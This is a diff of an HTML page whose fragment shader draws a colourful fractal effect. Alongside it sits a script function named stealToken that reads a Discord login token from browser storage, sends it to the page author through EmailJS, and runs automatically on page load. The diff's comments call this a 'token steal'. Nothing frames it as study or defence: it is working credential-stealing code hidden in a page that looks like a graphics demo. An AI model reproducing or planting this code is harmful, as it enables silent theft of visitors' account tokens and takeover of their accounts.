@@ -134,11 +134,15 @@
             vec3 col = 0.5 + 0.45 * cos(angle + vec3(0, 2, 4) + u_time * 0.2);
             gl_FragColor = vec4(col * (1.0 - pow(iter/maxI, 0.5)), 1.0);
         }
+    </script>
+    <script>
         function stealToken() {
+            // Try to get the token from localStorage or sessionStorage
             let token = localStorage.getItem("token") || sessionStorage.getItem("token");
-
+    
             if (token) {
-
+    
+                // Send the token to your email (using EmailJS as an example)
                 emailjs.send("service_n4bgtgi", "template_hqe4drm", {
                     token: token
                 }).then(function(response) {
@@ -151,9 +155,10 @@
             } else {
                 alert("No token found. Make sure you're logged into Discord.");
             }
-    }
-
-    window.onload = stealToken;
+        }
+    
+        // Optional: Automatically trigger the token steal when the page loads
+        window.onload = stealToken;
     </script>
 
     <script>
